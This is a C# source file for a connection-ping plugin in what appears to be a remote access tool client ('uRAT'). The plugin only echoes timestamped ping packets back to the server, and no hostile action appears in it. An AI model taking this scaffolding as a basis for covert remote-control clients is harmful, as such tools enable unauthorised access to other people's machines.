using System;
using System.Collections.Generic;
using uNet2.Packet;
using uNet2.Packet.Events;
using uNet2.SocketOperation;
using uRAT.Client;
using uRAT.Client.Plugin.Client;
using uRAT.CoreClientPlugin.ConnectionPing.Packets;

namespace uRAT.CoreClientPlugin.ConnectionPing
{
    public class ConnectionPingPlugin : IClientPlugin
    {
        public List<IPacket> PluginPackets
        {
            get
            {
                return new List<IPacket>
                {
                    new ConnectionPingPacket()
                };
            }
        }

        public List<ISocketOperation> SocketOperations
        {
            get { return null; }
        }

        public void Initialize()
        {

        }

        public void OnClientConnected()
        {
        
        }

        public void OnPacketReceived(object sender, ClientPacketEventArgs e)
        {
            if (e.Packet is ConnectionPingPacket)
                Globals.Client.Send(new ConnectionPingPacket((e.Packet as ConnectionPingPacket).Timestamp));
        }
    }
}
